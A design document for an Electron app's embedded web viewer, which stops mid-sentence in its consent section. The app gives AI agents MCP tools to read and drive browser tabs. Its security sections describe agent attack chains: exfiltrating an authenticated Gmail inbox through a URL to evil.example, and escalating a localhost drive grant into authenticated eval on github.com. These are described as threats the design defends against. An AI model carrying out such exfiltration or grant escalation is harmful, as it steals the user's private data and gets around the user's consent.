# Native web viewer

Links from agent chat open as additional tabs in the center pane, rendered by a main-process
`WebContentsView`, with MCP tools that let an agent observe and drive a tab.

Status: implemented through §10 commit 12 (branch `ivory-meadow-20260923`), except MCP tab
screenshots (§6 capture store) — see `docs/ARCHITECTURE.md` → "Native web viewer". Where the
build deviates from this text, the commit messages say so (migration 146, not 145;
`webRequest.onSendHeaders`, not `onBeforeRequest`; `revokeRun` via `onRunTerminal`).

Survey and adversarial critique that produced this document are summarised in
"Evidence" at the end; every constraint below was verified against the tree at
`0a6e4b3d5`.

## 1. Decisions

| Decision | Value |
| --- | --- |
| Targets | localhost dev servers, deployed/preview URLs, docs links, **claude.com-hosted Claude artifacts** |
| Primitive | main-process `WebContentsView` (Electron 44.1.1) |
| Chrome | minimal — back / forward / reload / URL / open-in-OS-browser |
| Link routing | chat + transcript markdown links only; Cmd-click escapes to the OS browser |
| Tab scope | per session |
| Lifetime | URL list persisted per session; restored by re-navigating from scratch |
| Cookies | **two partitions** — persistent for human-opened tabs, ephemeral for agent-opened tabs |
| Agent observe | console, network, errors, DOM/text, screenshot |
| Agent drive | navigate, reload, back, click, type, evaluate JS |
| Consent | observe free on the opening run's own tabs; drive and any read of a human tab prompt once per `(run, tab, frame principal, navigation epoch)`. **Its own surface — not `QuestionRouter`** (§7) |
| Agent-initiated opens | allowed, background only, never steals focus, marked `opened_by='agent'` |
| Capture storage | outside the repo, under the cyboflow data dir; `0700`/`0600`, per-run quota, TTL, deleted on revoke |
| Resources | only the visible tab paints; ~6 loaded views and 24 total tabs per session, both hard — **an agent pin cannot exceed them** |
| Global assistant rail | **out of scope for v1** |
| Audit | its own table, written on every open / grant / drive / privileged read |
| LiveCanvasEmbed | **left alone in v1**; convergence is follow-up work |

### Why `WebContentsView` and not an iframe

Measured 2026-09-23: `claude.ai` → `x-frame-options: SAMEORIGIN`; `github.com` → `deny`;
`docs.anthropic.com` → `SAMEORIGIN`. All three named targets refuse framing. Independently,
the packaged renderer CSP (`frontend/vite.config.ts:66`) sets
`frame-src 'self' blob: http://localhost:* http://127.0.0.1:*` and `cspPlugin` is `apply: 'build'` (`:84`), so an iframe viewer would work in `pnpm dev` and silently fail in every
shipped build. `webviewTag` is off and upstream-discouraged. Nothing of this kind exists in
the repo today: zero `WebContentsView`, `BrowserView` or `<webview>`; every current embed is
a loopback-only iframe.

## 2. Two partitions

The single shared partition originally proposed admits a zero-click exfiltration chain that
needs no drive grant at all: agent opens `https://mail.google.com` in the background (the
user sees only a tab-strip row) → `read_web_tab(include:['text'])` returns the authenticated
inbox → agent opens `https://evil.example/?d=<data>`, which is http(s) and so passes the only
URL policy. Splitting the jar removes the first step rather than gating the third.

- `persist:cyboflow-web-viewer` — tabs the **human** opened. Holds logins. An agent reading
  DOM/text/screenshot from one of these needs a consent grant.
- `cyboflow-web-agent-<sessionId>` — tabs an **agent** opened, one ephemeral partition **per
  cyboflow session**, wiped on quit. Agent observe here is free, which keeps the common case
  (its own dev server, a docs page, a preview URL) frictionless.

A tab's partition is fixed at creation from `opened_by` and never changes. An agent navigating
its own tab to an authenticated origin therefore lands there logged out.

**"Its own tab" needs an owner, and free observation needs a human-interaction tripwire.**
`opened_by` alone does not identify a run, and pages sharing a partition share a session
(`electron.d.ts:19470-19475`), so without both of the following any run could read any
historical agent tab — and if a human ever authenticated inside an agent tab, a *different*
run could open that origin in the same jar and read the authenticated page for free:

- `session_web_tabs.opened_by_run_id` is persisted, and free observation is granted **only to
  that run**. Any other run reads it under the human-tab rules.
- A tab flips to `human_touched` on the first real user input into its view
  (`before-input-event`, or a mouse event on the view). From then on every agent read of it is
  consent-gated regardless of `opened_by`, and the flag is persisted so it survives a restart.
- Per-session partitions keep one session's incidental credentials out of another's reach even
  before the flag fires.

## 3. Architecture

### 3.1 Main process — `main/src/services/webViewer/`

- `webViewerManager.ts` — `Map<tabId, WebContentsView>`; create / navigate / back / forward /
  reload / destroy; attach to and detach from `mainWindow.contentView`; bounds; visibility;
  LRU. Takes a `getMainWindow: () => BrowserWindow | null` **accessor**, never a captured
  reference (precedent: `setupEventListeners(services, getMainWindow)`), and reaps on
  `mainWindow.on('closed')` — macOS re-creates the window on dock activate, which would
  otherwise orphan the map and leak live remote `webContents`.
- `webViewerGuard.ts` — pure, Electron-free navigation and scheme policy, unit-testable
  (precedent: `main/src/ipc/artifactFrameGuard.ts`). http/https only; popups become a new
  viewer tab or an OS-browser open, never a real popup window.
- `webViewerTelemetry.ts` — per-tab bounded ring buffers with a monotonic cursor.
- `webViewerDriver.ts` — CDP via `webContents.debugger`, for drive and heavy reads only.
- `webViewerConsent.ts` — grants keyed `(runId, tabId, framePrincipal, navigationEpoch)`, with
  its own prompt surface (§7).
- `webViewerLifecycle.ts` — `disposeSession(sessionId)` and `revokeRun(runId)`.
- `main/src/webViewerComposition.ts` — boot wiring. `index.ts` has ~40 lines of ratchet
  headroom; precedent `verifyComposition.ts` / `evalComposition.ts`.

**Teardown is not covered by `mainWindow.on('closed')` alone.** Dismissing a session
*archives* it — `main/src/ipc/session.ts:1825` calls `archiveSession`, which is
`UPDATE sessions SET archived = 1` (`database.ts:2743-2746`) — so the `ON DELETE CASCADE` on
`session_web_tabs` never fires, and the renderer's `centerPaneStore` cleanup
(`centerPaneStore.ts:324-330`) only drops Zustand state and cannot destroy a main-process
view. Without an explicit hook, a dismissed or merged session keeps live renderers, network
traffic, debugger attachments, telemetry buffers, pins and consent grants until the whole
window closes. So `disposeSession` / `revokeRun` destroy views, detach the debugger, remove
session and `webRequest` listeners, cancel timers, clear buffers, revoke grants and delete
captures — wired into archive, merge, delete, run completion, run cancellation and
`before-quit`.

**Crash handling.** `render-process-gone` (`electron.d.ts:17463-17475`) leaves a map entry
pointing at a dead `webContents`, which would otherwise be reported as `live` or `hidden` while
every capture, navigation and evaluate call fails inconsistently. A crashed tab moves to the
`crashed` state (§3.4), drops its cached frame tokens and telemetry cursor, invalidates its
grants and navigation epoch, and shows an explicit reload affordance. Recovery is a fresh view,
never a reused one.

**Auth and TLS are fail-closed, and human-only.** Neither has a handler in main today. Local
dev targets routinely use HTTP Basic auth or a self-signed certificate, so without an explicit
policy such pages hang awaiting a callback. Register `login`
(`electron.d.ts:17271-17294`) and `certificate-error` (`:16157-16205`) on the viewer
`webContents`: both deny by default and surface a typed `auth_required` / `certificate_error`
tab state. Any exception is granted by a human, scoped to that session, and **never inherited
from a drive grant**.

**webPreferences** for every viewer view: no preload, `nodeIntegration:false`,
`contextIsolation:true`, `sandbox:true`, the partition chosen per §2, plus
`disableDialogs: true` (`alert`/`confirm` from a remote page would otherwise block the app;
it overrides `safeDialogs`, so do not set both) and
`autoplayPolicy: 'document-user-activation-required'`.

**Partition hardening**, on the persistent session and on every per-session agent session:
`setPermissionCheckHandler((_wc, p) => ALLOWED.has(p))` returning a boolean, and
`setPermissionRequestHandler((_wc, _p, cb) => cb(false))` which returns `void` and answers
through its callback — the two handlers have different shapes and a boolean returned from the
request handler grants nothing. `ALLOWED` is empty in v1. Also set
`setDevicePermissionHandler` and `setDisplayMediaRequestHandler`; the deny set must cover
`fileSystem`, `openExternal` and `display-capture`, not just camera/mic/geolocation.
`will-download` → cancel in v1.

### 3.2 Telemetry does not ride CDP

Two in-repo facts kill an always-on CDP session. `main/src/menu.ts:34` ships
`{ role: 'toggleDevTools' }` with its default accelerator, and a role-based item acts on the
**focused** `webContents` — once the user clicks into the viewer, one keystroke detaches the
debugger permanently (`electron.d.ts:7520` documents exactly this). And `pnpm dev` appends
`--remote-debugging-port=9223` (`scripts/dev-electron.mjs:34`), which `docs/AGENT-GUIDE.md`
names as the primary way to drive the UI — an external CDP client is already attached to the
same targets.

So the always-on buffers come off non-detachable surfaces:

| Signal | Source |
| --- | --- |
| console + uncaught errors | `webContents.on('console-message')` — in Electron 44 the payload carries `frame: WebFrameMain`, so it is WebContents-wide, subframes included, with frame attribution for free |
| navigation | `did-start-navigation`, `did-navigate`, **`did-navigate-in-page`** |
| load failures | `did-fail-load` |
| crashes | `render-process-gone` |
| network | `session.fromPartition(...).webRequest` — `onBeforeRequest` (start map) correlated with `onCompleted` / `onErrorOccurred`; browser-process, covers every frame |

`debugger.attach()` is reserved for DOM snapshot, `Runtime.evaluate`, screenshot and `Input`.
It is attached lazily, guarded by `isAttached()` inside try/catch (`attach()` has no
idempotent form and throws on a second call), with a per-tab
`debugger.on('detach', …)` that stamps the telemetry cursor so a later read reports an
explicit gap and reason instead of silently returning nothing.

Network telemetry stores URL / status / duration / failure text only, through a **redacting
allowlist writer** that is the single writer into the ring buffer — raw CDP and raw
`webRequest` headers carry `Cookie`, `Set-Cookie` and `Authorization`. Where the CDP Network
domain is enabled at all, pass
`{ maxTotalBufferSize: 0, maxResourceBufferSize: 0, maxPostDataSize: 0 }` so Chromium retains
no response bodies of its own.

**Do not overclaim what `webRequest` can attribute.** `OnCompletedListenerDetails` carries a
single `timestamp` and only *optional* `webContentsId` and `frame`
(`electron.d.ts:22897-22945`); the same holds for the error details. So: duration comes from an
`onBeforeRequest` start map keyed by request id, and a terminal event with no matching start
reports a bare completion timestamp rather than a fabricated duration. Frame and tab
attribution are **nullable** — service-worker requests, and requests whose frame has already
navigated or been destroyed, land in an explicit `unattributed` bucket instead of being
misfiled against the wrong document.

**In-page navigation must be tracked separately.** `did-navigate` is not emitted for in-page
navigation (`electron.d.ts:16820-16824`); `did-navigate-in-page` is (`:16877-16907`). Without
it a `history.pushState` / `replaceState` / hash change silently moves the visible route while
`currentUrl`, the persisted row, the URL chrome and the consent navigation epoch all go stale —
which matters most where it is least visible, since the route can carry the sensitive part of
the URL. Main-frame `did-navigate-in-page` updates all four. A same-origin in-page change
**retains** an existing grant (same frame principal) but still bumps the epoch, so redaction is
recomputed.

### 3.3 Out-of-process iframes

A Claude artifact renders in a cross-origin sandboxed iframe with its own origin, which
Chromium puts in its own renderer process. A session attached to the top-level `WebContents`
receives no `Runtime.consoleAPICalled`, no `Log.entryAdded` and no `Network.*` from it, and
`DOM.getDocument` / `Runtime.evaluate` cannot reach into it. `Input.dispatch*Event` **is**
routed by hit-testing and does reach an OOPIF — so without this section drive appears to work
while observe silently returns nothing, which is the worst failure shape for a debugging tool,
on the single use case the user named as most common.

- Console and network are frame-agnostic already (§3.2). Every ring-buffer entry stores
  `frame.url` / `frame.origin` so an agent can tell wrapper from artifact.
- DOM / text / evaluate iterate `webContents.mainFrame.framesInSubtree` and call
  `frame.executeJavaScript(...)` per frame, tagging each result with
  `frameToken` / `url` / `origin` / `processId`.
- Where CDP is genuinely needed, use flattened multi-session:
  `Target.setAutoAttach({autoAttach:true, flatten:true, waitForDebuggerOnStart:true})`,
  **re-issued on every newly attached child session** (flatten does not recurse); on
  `Target.attachedToTarget` enable the domains on that `sessionId` and only then
  `Runtime.runIfWaitingForDebugger`, which is what captures the artifact's startup errors;
  route by the `sessionId` argument on both `debugger.on('message', …)` and `sendCommand`;
  invalidate cached frame handles on `Target.detachedFromTarget`, since an OOPIF's
  `sessionId` changes on cross-process navigation.
- `cyboflow_read_web_tab` and `cyboflow_drive_web_tab` take a `frame` selector (default: top
  frame; `'all'`, or a frame token).

**Frame-scoped consent, reconciled with the origin recheck.** Keying the gate on "the frame's
origin" and re-reading `webContents.getURL()` before dispatch are two different rules, and
taken together a cross-origin iframe could be read under the top-level grant. The single rule
is: resolve and **snapshot the selected frames first**, then require a grant for every distinct
frame **security principal** in that snapshot — so `frame: 'all'` over a page with an artifact
iframe needs two grants, not one. A principal is `(origin, frameToken, documentGeneration)`;
`WebFrameMain.origin` can be the string `"null"` for an opaque/sandboxed document
(`electron.d.ts:19204-19214`, `:19255-19263`), so an opaque document's principal is derived
from its frame token and generation rather than collapsing every sandboxed frame in the app
into one `"null"` identity. Grants are bound to the navigation epoch, and operations are
**rejected during provisional navigation** rather than racing it. The top-level
`getURL()` recheck of §7 applies to the top-frame principal only.

### 3.4 Suspension, and the agent pin

Navigating a background tab to `about:blank` would blank exactly the state requirement (2)
exists to report: an agent-opened tab is background by definition, so every observe call would
return `about:blank`'s DOM, a blank screenshot and an empty delta.

Separate *paints* from *is loaded*:

- Background tab → `view.setVisible(false)` and/or `contentView.removeChildView(view)`. The
  document, its JS context, its listeners and its ring buffers stay alive. **Suspension never
  changes a tab's committed URL** — pin this as a unit test.
- An **agent pin** exempts a tab from *voluntary* unloading: set while the tab was agent-opened,
  or any agent has read its telemetry within 10 minutes, refreshed on each read. A pinned view
  is created and `loadURL`'d but not added to `contentView` — parking it inside the window at
  off-screen bounds would reintroduce the paint burn, because a `webContents` "displayed in"
  the window forces frames to be drawn and swapped for the whole window.
- **The caps are hard, and a pin cannot exceed them.** `maxLoadedViews` (6) and `maxTabs` (24)
  are per session, plus a global loaded-view ceiling and a rate limit on agent opens. Pins
  *compete within* the loaded cap — the least-recently-read pin is evicted first — so an
  adversarial agent opening tabs in a loop cannot hold unbounded renderers, timers and network
  activity alive without ever asking a human. Past `maxTabs` an agent open is **rejected** with
  `tab_limit_reached`; it does not silently create an unloaded row that a later read would
  resurrect.
- Beyond the loaded cap, LRU-**destroy** — a destroyed tab is just a URL row, re-navigated on
  demand. Eviction is always reported, never silent (§6 error contract).
- Do not call `setBackgroundThrottling(true)`: it is already the Electron default, so the call
  buys nothing. If a hidden view still burns CPU (the `LiveCanvasEmbed.tsx:109-117`
  MacWebContentsOcclusion note is about a hidden *window*, unverified for a hidden child
  view — measure with `pnpm dev:perf`), freeze via CDP
  `Page.setWebLifecycleState({state:'frozen'})`, reversible with `'active'`.
- Every MCP tool returns an explicit
  `state: 'live' | 'hidden' | 'evicted' | 'crashed' | 'auth_required' | 'certificate_error'`,
  so an agent can never mistake a suspended, dead or blocked tab for a blank page. A read of an
  `'evicted'` tab re-navigates and waits for load — that is not a focus change, so it does not
  violate "never steals focus". A read of a `'crashed'` tab fails with `tab_crashed`; recovery
  is a human reload or an explicit drive `reload`, and always a fresh view.
- The tab's URL is returned **redacted before a grant** (§6) — `state` is not a licence to read
  the address.

### 3.5 tRPC, not `ipcMain`

`noNewIpcHandlers.test.ts` freezes per-file `ipcMain.handle` counts, so the renderer↔main
surface is a router at `main/src/orchestrator/trpc/routers/webViewer.ts`: `open`, `navigate`,
`back`, `forward`, `reload`, `close`, `setBounds`, `setVisible`, `list`, plus subscriptions
`onTabState` and `onTelemetryCount`.

**The layering constraint is wider than the original plan assumed.**
`main/eslint.config.js:37` applies `no-restricted-imports` at **error** level to
`src/orchestrator/**/*.ts`, banning `electron` and `**/services/**` with three frozen
exemptions, backstopped by
`main/src/orchestrator/__tests__/standaloneInvariant.test.ts` (which also catches dynamic
`require`/`await import`). That covers the tRPC router, `mcpQueryHandler.ts`, **and** the new
MCP handler module — none of them may value-import the manager, the driver, or `electron`.

Seams, as plain structural interfaces, in
`main/src/orchestrator/trpc/contracts/webViewerOps.ts` (the current precedent for tRPC context
seams — `configOps`, `sessionGitOps`, …):

- `WebViewerLike` — open / navigate / back / forward / reload / close / setBounds / setVisible / list
- `WebViewerTelemetryLike` — read a bounded delta since a cursor
- `WebViewerDriverLike` — drive verbs plus dom / text / screenshot capture

Typed structurally, e.g. `evaluate(tabId, expression): Promise<{ok: boolean; value?: unknown}>`
and `screenshot(tabId): Promise<{path: string}>`. Never surface `Electron.Debugger` across the
seam. Wire concretely from `webViewerComposition.ts`. Wire shapes the renderer needs go in
`shared/types/webViewer.ts`, which is compiled into the Vite renderer and must stay
Electron-free.

### 3.6 Renderer

- `shared/types/centerPane.ts` — `TabKind` gains `'web'`; `TabItem` gains `initialUrl`,
  `currentUrl`, `openedBy`, `openedByRunId`, `humanTouched`.
- **Tab identity is an opaque uuid**, not `webTabId(url)`. Every existing helper
  (`fileTabId`, `artifactTabId`, `approvedDesignTabId`) keys on something immutable; a web
  tab's URL changes on the first click. `openWebTab` mints `web:${crypto.randomUUID()}`
  renderer-side (precedent: `customViewsStore.ts:280`) and passes it **into**
  `webViewer.open({tabId, url})`, so the action stays synchronous like its siblings. That one
  id is the correlation key across `TabItem.id`, the manager's map, `session_web_tabs.id` and
  the handle the MCP tools address, and it is **reused verbatim on restore** — re-minting
  would orphan grants, cursors and persisted position. `currentUrl` and `title` are rewritten
  on `did-navigate`, **`did-navigate-in-page`** and `page-title-updated`.
- Both `RunCenterPane.tsx:239` and `QuickSessionCenterPane.tsx:140` `renderActiveTab()` need a
  `'web'` arm. Missing the QuickSession copy renders the flow canvas for links from quick
  chats — the likeliest source.
- `CenterPaneTabStrip.tsx:50 edgeColor` and `:58 tabGlyph` both fall through to the artifact
  branch, so an unhandled kind renders silently mis-styled. **No favicon in v1**: the strip is
  text glyphs by design, and the packaged CSP's `img-src` would block a remote favicon — the
  exact dev/packaged asymmetry this document warns about. Use a glyph and drop `favicon` from
  the `onTabState` payload. Page-supplied titles are truncated and never interpreted as markup.
- `WebViewTab.tsx` — minimal chrome plus a **bounds anchor div**; the page is the native view
  painted over that rect.
- `useWebViewBounds.ts` — ResizeObserver, rAF-throttled. **Scale in main, not the renderer:**
  `setBounds` is DIP-relative while `getBoundingClientRect` is renderer CSS px, so the manager
  multiplies the supplied rect by `mainWindow.webContents.getZoomFactor()` and rounds. Do not
  derive zoom from `devicePixelRatio` — that is zoomFactor × display scaleFactor.
- **Keyboard**: a focused native view kills every renderer shortcut and Escape handler. On
  each viewer `webContents`, `before-input-event` gated to `input.type === 'keyDown'` resolves
  the reserved chords **in main** and pushes a **semantic action** to the renderer — never a
  synthetic key event — then calls **`event.preventDefault()`**, which suppresses both the page
  and the menu accelerator (`electron.d.ts:16102-16112`); without it the page receives the same
  keystroke and acts on it twice. Same commit adds a `context-menu` handler
  (copy / copy link / reload / open in browser).
- **The shortcut registry has to grow first.** `shared/types/keyboardShortcuts.ts:57-82` holds
  exactly eight bindable actions, so `resolveAllShortcuts` alone does not cover the app's real
  chords: Cmd-Shift-S (`useAddQuickSessionShortcut.ts`), Cmd-Shift-C (`useAddClaudeShortcut.ts`),
  Cmd-Shift-` (`useAddTerminalShortcut.ts`), Cmd-E (`useEditWorkflowShortcut.ts`) and
  Cmd-Shift-T (`App.tsx:283-297`) are each hand-rolled in their own hook and would simply stop
  working while the view has focus. Commit 3 therefore lands **one shared reserved-chord
  registry** covering every app-level shortcut plus the Escape policy, which both the renderer
  hooks and the main-process matcher read. Precedence is defined, not implicit: an open modal or
  overlay wins over the view, the view wins over the page, and a focused text input inside the
  page keeps its own editing keys.

### 3.7 Occlusion

A native view paints above all DOM. The counter is single; the wiring is not — 29 `.tsx`
files carry their own `z-20..z-50` overlay and only 3 import `ui/Modal` or `ui/Dropdown`, so
there is no common ancestor to instrument. Split into two commits:

- **4a, central hooks (6 edits, most call sites):** `ui/Modal.tsx`, `ui/Dropdown.tsx`,
  `ConfirmDialog.tsx` (hand-rolls its own scrim but has 23 importers),
  `contexts/ContextMenuContext.tsx` (the only thing positioning a `fixed z-50` menu at cursor
  coords), `hooks/useResizable.ts` and `hooks/useResizablePanel.ts` (increment for a drag;
  these back every resize site).
- **4b, residual one-offs:** `App.tsx:515`, `AboutDialog`, `BugReportDialog`,
  `NimbalystInstallDialog`, `RunScriptConfigDialog`, `ArmDismissGuardDialog`,
  `ExperimentCancelDialog`, `DraggableProjectTreeView`, `DesignModeSurface`,
  `OnboardingModalCard`, `OnboardingOverlay`, `OnboardingSpiralReveal`, `GuidedLeader`,
  `CombinedDiffView`, **`CyboflowRoot.tsx:718-727`** (the fixed `z-50` success toast, rendered
  outside the session gate) and **`McpHealthIndicator.tsx:148`** (an absolute `z-50` status
  popover).

**A static inventory is not the deliverable — registration is.** The two overlays above were
missing from the first pass, which is the point: every future toast, popover or portal will be
too. So 4b also lands an **occlusion registry** every overlay must enter (one hook, one
`useOcclusion()` call) plus a lint/convention test that fails when a component introduces a
`fixed`/`absolute` `z-40+` full-bleed overlay without registering. Without that, the invariant
regresses silently the next time someone adds a toast, and the symptom — an overlay painted
behind the page, or unclickable — looks like a CSS bug rather than a viewer bug.

## 4. Link routing

`MarkdownPreview.tsx:101-105` **already** overrides `a` inside the module-scope
`MARKDOWN_COMPONENTS` map, with `target="_blank" rel="noopener noreferrer"` and no `onClick`;
the escape happens in main at `index.ts:1351` via `setWindowOpenHandler` →
`isSafeExternalOpenTarget` → `shell.openExternal`, **not** through a renderer `openExternal`
IPC channel. So this is an **edit to that existing entry**, not a new one — a second `a:` key
is a `no-dupe-keys` lint error. The map must stay module-scope (hoisting comment at :18-25) or
every transcript re-render re-parses all markdown, so the entry consults a
`WebLinkContext` whose default is `null` → today's behaviour. Chat surfaces
(`MessageSegment` / `ChatTranscript`) wrap in a provider.

This is the single ReactMarkdown call site in the renderer, so a regression there hits every
markdown surface in the app — scope the review accordingly. `MarkdownPreview` is **not**,
however, the only place a user sees a URL: plain-text (non-markdown) URLs and xterm output are
not linkified at all today. v1 covers markdown links only; `@xterm/addon-web-links` is an
installed-but-never-imported dependency and wiring it is real work, not a config flip.

The href reaching `openWebTab` is not guaranteed to be an absolute http(s) URL — resolve and
scheme-check before opening, and fall back to the existing external path otherwise.
Cmd/Ctrl-click, middle-click and a context-menu item bypass to the OS browser.
`isSafeExternalOpenTarget` is untouched.

## 5. Persistence

Migration — **`145_session_web_tabs.sql`**. On-disk highest is 143 and 144 is already claimed
by an unmerged worktree; re-check immediately before merge, because the ledger tracks by
filename and a renumbered file re-applies wholesale.

```sql
CREATE TABLE IF NOT EXISTS session_web_tabs (
  id              TEXT PRIMARY KEY,
  session_id      TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
  initial_url     TEXT NOT NULL,
  current_url     TEXT,
  title           TEXT,
  position        INTEGER NOT NULL,
  opened_by       TEXT NOT NULL CHECK (opened_by IN ('user','agent')),
  opened_by_run_id TEXT,
  human_touched   INTEGER NOT NULL DEFAULT 0,
  created_at      TEXT,
  last_active_at  TEXT
);
CREATE INDEX IF NOT EXISTS idx_session_web_tabs_session
  ON session_web_tabs(session_id, position);

CREATE TABLE IF NOT EXISTS session_web_events (
  id          TEXT PRIMARY KEY,
  session_id  TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
  tab_id      TEXT,
  run_id      TEXT,
  kind        TEXT NOT NULL,
  origin      TEXT,
  detail      TEXT,
  created_at  TEXT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_session_web_events_session
  ON session_web_events(session_id, created_at);
```

`session_web_events` is the **audit trail**, and it needs its own table: a human tab open
belongs to no run, and `raw_events` is run-scoped and cascade-deleted with the run
(`006_cyboflow_schema.sql:36-44`), so an audit stored there would vanish exactly when someone
wants to consult it. `tab_id` and `run_id` are nullable for that reason, `origin` is the
redacted origin only, and `detail` never carries a full URL. An in-memory buffer is not an audit
trail.

`IF NOT EXISTS` is required by `main/src/database/migrations/AGENTS.md:9-14` (idempotence) and
because the ledger tracks by filename, so a renumbered file re-applies wholesale — not, as an
earlier draft claimed, because `verify-schema-parity` would pre-create the table. It replays
migrations after applying `schema.sql` (`scripts/verify-schema-parity.js:94-125`), but since
this table is deliberately absent from `schema.sql` that collision never arises. The guard is
still correct; the stated reason was not.

**Do not mirror the table into `schema.sql`.** A new table reaches both parity paths through
the migration alone; `schema.sql` declares only 8 legacy tables, and `ideas` / `epics` /
`tasks` / `review_items` / `artifacts` are all migration-only. The dual-source rule in
`migrations/AGENTS.md` is about *column* changes to tables `schema.sql` already declares. Note
also that `verify:schema`'s signature compares columns and foreign keys only — it does **not**
check CHECK constraints or indexes, so it is not a proof of the whole table shape.

DB methods go in a new `main/src/database/webTabsRepository.ts`; `database.ts` has ~54 lines of
ratchet headroom and should not spend it here. `session_web_tabs` is not one of the four
chokepoint tables, so no router is required — but if a capture is ever surfaced as a
deliverable it must go through `ArtifactRouter.apply`, and a finding through `ReviewItemRouter`.

Restore creates tabs **unloaded**, reusing the persisted `id` so grants, cursors and position
survive; the tab strip shows the persisted `title` (falling back to the hostname) until first
focus or an agent pin loads it. `human_touched` is restored with the row — a tab that a human
typed into before the restart stays consent-gated afterwards.

Because session dismissal archives rather than deletes (§3.1), the `ON DELETE CASCADE` above
only fires on a real session delete. `disposeSession` deletes the tab rows explicitly; the audit
rows are retained until the session is genuinely deleted.

## 6. MCP tools

Declared once via `defineTool` in `toolRegistry/runScopeTools.ts`; run scope only in v1
(matching the deferred rail). Never a case-arm or `inputSchema` literal in
`cyboflowMcpServer.ts`.

| Tool | Envelope | Purpose |
| --- | --- | --- |
| `cyboflow_web_tabs` | `mcp-web-tabs` | list this session's tabs: opaque id, `state`, `openedBy`, and a **redacted origin only** before a grant |
| `cyboflow_read_web_tab` | `mcp-read-web-tab` | telemetry delta since a cursor; optional `include: ['dom'\|'text'\|'screenshot']`, optional `frame` |
| `cyboflow_open_web_tab` | `mcp-open-web-tab` | background open in this session's ephemeral partition, `opened_by='agent'`, `opened_by_run_id` stamped |
| `cyboflow_drive_web_tab` | `mcp-drive-web-tab` | navigate / back / forward / reload / click / type / eval; blocks on consent |

**Envelope names must be kebab-case, lowercase-and-hyphen only** — no underscores, no digits.
`toolRegistryRatchet.test.ts:99,109` discovers envelopes by `/case ['"]([a-z-]+)['"]:/` and
`/type: ['"]([a-z-]+)['"];/`, so an underscored envelope is invisible to the scan and fails
the gate. Do not mirror the underscored tool names.

Handlers live in `main/src/orchestrator/mcpServer/handlers/webViewerToolHandlers.ts`
(precedent `verifyToolHandlers.ts`), subject to the `orchestrator/**` import ban of §3.5.

**Ratchet arithmetic.** `mcpQueryHandler.ts` is at 4543/4543, and
`fileSizeRatchet.test.ts:80-91` carries a *second* assertion — `cap <= floor(lines * 1.02)` —
so a standalone "extract to free headroom" commit banks nothing (all six historical cap
changes on this entry set the cap to the exact size). And
`main/src/orchestrator/mcpServer/__tests__/toolRegistryRatchet.test.ts` pins the
`case` arms **inside** `handleMessage` in that exact file (`:53`, `:93-99`), so they cannot be
relocated. The
commit that adds the arms must therefore carry its own offsetting extraction and lower the cap
to the new exact size in the same commit: *extract N lines, add ~30, net −(N−30), cap =
4543 − (N−30)*.

**`ompGateConfigBuilder` is a hard gate, not a silent one.**
`main/src/services/panels/omp/__tests__/ompGateConfigBuilder.test.ts:71` asserts exact set
equality between the hardcoded
`CYBOFLOW_MCP_TOOL_NAMES` and the union of the three registry scope tables, so a registry
entry with no matching name fails `test:unit` outright. Same commit, every time.

**Error contract.** There is no `code` field in this codebase; handlers reply
`{ok:false, error:'<snake_case_code>'}` or `'<code>: <detail>'`. Argument-shape failures are
already `invalid_arguments` from `defineTool.prepare`, so new codes cover only lifecycle:
`tab_not_found`, `tab_closed`, `tab_evicted`, `tab_crashed`, `tab_limit_reached`,
`origin_changed`, `frame_principal_changed`, `navigating`, `consent_denied`,
`consent_timeout`, `frame_not_found`, `auth_required`, `certificate_error`, `not_tab_owner`,
`viewer_disabled`.

**URLs are redacted before a grant.** Every tool returns the current URL, and
`cyboflow_web_tabs` is free — so without this an agent could enumerate authenticated addresses
it is not allowed to read the pages of, and full URLs routinely carry OAuth codes, password-reset
tokens, signed download parameters, document ids and search queries. Pre-grant, a tab reports
only its opaque id, `state`, `openedBy` and a sanitized **origin** (scheme+host+port); never
userinfo, path, query or fragment. The same sanitation applies to the persisted `current_url`
rendered in any agent-visible surface and to every `session_web_events` row.

**Captures go outside the repo** — under the cyboflow data dir, never into a worktree or the
run-artifacts root (this repo is public). The MCP reply carries a path pointer, never inline
bytes. Retention and permissions are part of the contract, not an afterthought: per-session and
per-run directories at mode `0700` with files at `0600` (the existing precedent,
`capturePageBackend.ts:480,548`, creates both at process defaults, so a permissive umask would
expose screenshots of authenticated pages to any other local account), server-generated random
names, a containment check on every write, a per-run byte and count quota, a TTL sweep, and
**deletion on grant revocation or `disposeSession`** unless the human explicitly kept a capture.
Otherwise a screenshot of a signed-in page outlives the grant, the run and the session. Screenshot of a hidden tab goes through CDP with a forced-frame sequence
(`Emulation.setDeviceMetricsOverride` → `Page.captureScreenshot` →
`Emulation.clearDeviceMetricsOverride`); `capturePage()` on a non-painting composited view is
not a designed path, and the repo's own offscreen precedent
(`capturePageBackend.ts:482-492`) works only because it uses `offscreen: true` on a
`show:false` BrowserWindow, which a `WebContentsView` cannot do. If that sequence does not
yield a real frame on macOS, return `state:'hidden'` with no image rather than a blank PNG.

There is no server-push on this transport: observe is pull, drive is a blocking tool.

## 7. Consent and the kill switch

**Grant key is `(runId, tabId, framePrincipal, navigationEpoch)`, enforced at dispatch.**
Keying on the tab alone is escalation: approve drive on `localhost:5173` (an easy yes) → `navigate` to
`github.com` on the same tab → `eval` now runs in a github.com document with the user's
session, where same-origin authenticated `fetch` defeats HttpOnly entirely. Removing
`navigate` from the verb list does not help, because `eval` can set `location.href`. So every
privileged verb re-resolves the target principal immediately before dispatch and fails closed
on mismatch with `origin_changed` / `frame_principal_changed`, and rejects with `navigating`
while a navigation is provisional. Exact scheme+host+port match, no prefix matching. Frame
principals follow §3.3.

**The prompt does NOT reuse `QuestionRouter`.** An earlier draft proposed it because it is
already callable from main. That is wrong: `requestQuestion` transitions the run to
`awaiting_input` and supersedes any existing pending question as a "self-healing" measure
(`questionRouter.ts:437-458`), and answering runs workflow-specific side effects including
`promoteTasksOnPlanApproval`, `retireShipIdeasOnPlanApproval`,
`deletePendingDraftsForPlanApproval` and `completePlannerRunForApprovedPlan` (`:788-811`). So a
web-consent prompt could supersede a real agent gate, be superseded by one, or — worst — have an
affirmative consent answer interpreted by plan-approval hooks and mutate or complete a planning
workflow. It also cannot represent two concurrent origin prompts.

Consent therefore gets its **own** path: `webViewerConsent.ts` raises a request that renders as
a sheet **on the tab itself** (the tab is already a UI surface, so the prompt appears exactly
where the page it concerns is), resolved over the viewer's own tRPC subscription, with its own
